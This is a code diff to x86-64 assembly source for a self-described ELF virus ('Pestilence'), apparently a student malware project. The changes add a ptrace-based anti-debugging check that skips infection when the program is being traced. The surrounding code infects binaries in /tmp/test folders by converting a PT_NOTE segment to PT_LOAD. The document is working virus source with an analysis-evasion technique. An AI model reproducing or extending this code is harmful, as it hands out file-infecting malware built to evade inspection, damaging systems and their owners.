@@ -18,11 +18,16 @@ begin:
 	push r10
 	push r11
 
+	call can_run_infection				; if (can_run_infection() == 0)
+	cmp rax, 0					; 	goto .skipped;
+	je .skipped					; ...
+
 	lea rdi, [rel infected_folder_1]		; treate_folder(infected_folder_1);
 	call treate_folder				; ...
 	lea rdi, [rel infected_folder_2]		; treate_folder(infected_folder_2);
 	call treate_folder				; ...
 
+.skipped:
 	; restore all registers
 	pop r11
 	pop r10
@@ -41,6 +46,26 @@ _jmp_instr:
 	mov rax, SYS_EXIT				; exit(
 	xor rdi, rdi					; 0
 	syscall						; );
+
+; int can_run_infection();
+; rax can_run_infection();
+can_run_infection:
+	mov rax, SYS_PTRACE				; _ret = ptrace(
+	mov rdi, PTRACE_TRACEME				; 	PTRACE_TRACEME,
+	xor rsi, rsi					; 	0,
+	xor rdx, rdx					; 	0
+	syscall						; );
+	cmp rax, 0					; if (_ret < 0)
+	jl .debugged					; 	goto .debugged;
+
+	mov rax, 1					; return 1;
+	ret
+
+	.debugged:
+		lea rdi, [rel debugged_message]		; print_string(debugged_message);
+		call print_string			; ...
+		xor rax, rax				; return 0;
+		ret
 
 ; void treate_folder(char const *_folder);
 ; void treate_folder(rdi folder);
@@ -657,6 +682,34 @@ convert_pt_note_to_load:
 	pop rbp
 	%pop
 	ret						; return _ret;
+
+; void print_string(char const *str);
+; void print_string(rdi str);
+print_string:
+	push rdi					; save str
+	xor rdx, rdx					; _len = 0;
+	.begin_strlen_loop:				; while (true) {
+		mov sil, [rdi]				; _c = *_str;
+		cmp sil, 0				; if (_c == 0)
+		je .end_strlen_loop			; 	break;
+		inc rdx					; _len++
+		inc rdi					; _str++;
+		jmp .begin_strlen_loop			; }
+	.end_strlen_loop:				; ...
+	pop rsi						; load str
+	mov rax, SYS_WRITE				; write(
+	mov rdi, 1					; 	1,
+	syscall						;	str, _len);
+	mov rax, SYS_WRITE				; write(
+	mov rdi, 1					; 	1, 
+	push 0x0A					; 	'\n',
+	mov rsi, rsp					; 	...
+	mov rdx, 1					; 	1
+	syscall						; );
+	add rsp, 8					; unpop '\n'
+
+	ret
+
 section .data
 	infected_folder_1: db "/tmp/test/", 0
 	infected_folder_2: db "/tmp/test2/", 0
@@ -664,5 +717,6 @@ section .data
 	len_elf_64_magic: equ $ - elf_64_magic
 	; never used but here to be copied in the binary
 	signature: db "Pestilence v1.0 by jmaia and dhubleur"
+	debugged_message: db "DEBUG DETECTED, dommage ;) !", 0
 
 _end:
